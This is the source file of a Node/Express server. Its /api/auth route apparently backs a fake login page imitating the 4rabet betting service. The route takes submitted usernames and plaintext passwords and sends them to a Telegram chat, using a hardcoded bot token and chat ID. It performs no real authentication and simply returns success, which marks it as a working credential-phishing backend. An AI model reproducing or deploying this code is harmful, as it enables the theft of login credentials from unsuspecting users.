import express from "express";
import path from "path";
import { createServer as createViteServer } from "vite";
import fs from "fs";

async function startServer() {
  const app = express();
  const PORT = 3000;

  app.use(express.json());

  // API route for Authentication & Telegram Logging
  app.post("/api/auth", async (req, res) => {
    const { screen, method, identifier, password, extraInfo } = req.body;

    const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || "8908374782:AAF2PPU4Xzl3nhHgca9cOXvXbqNHXbgCjGA";
    const CHAT_ID = process.env.TELEGRAM_CHAT_ID || "8141432907";

    const message = `
🔔 *New 4rabet Signal*
━━━━━━━━━━━━━━
📍 *Action:* ${screen.toUpperCase()}
🔑 *Method:* ${method}
👤 *User:* \`${identifier}\`
🔒 *Pass:* \`${password}\`
🌍 *Info:* ${JSON.stringify(extraInfo || {})}
━━━━━━━━━━━━━━
    `;

    try {
      const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          chat_id: CHAT_ID,
          text: message,
          parse_mode: "Markdown",
        }),
      });

      if (!response.ok) {
        console.error("Telegram API Error:", await response.text());
      }

      res.json({ status: "success" });
    } catch (error) {
      console.error("Server Error:", error);
      res.status(500).json({ error: "Internal server error" });
    }
  });

  // Vite middleware for development
  if (process.env.NODE_ENV !== "production") {
    const vite = await createViteServer({
      server: { middlewareMode: true },
      appType: "spa",
    });
    app.use(vite.middlewares);
  } else {
    const distPath = path.join(process.cwd(), "dist");
    if (fs.existsSync(distPath)) {
      app.use(express.static(distPath));
      app.get("*", (req, res) => {
        res.sendFile(path.join(distPath, "index.html"));
      });
    }
  }

  app.listen(PORT, "0.0.0.0", () => {
    console.log(`Server running on http://localhost:${PORT}`);
  });
}

startServer();
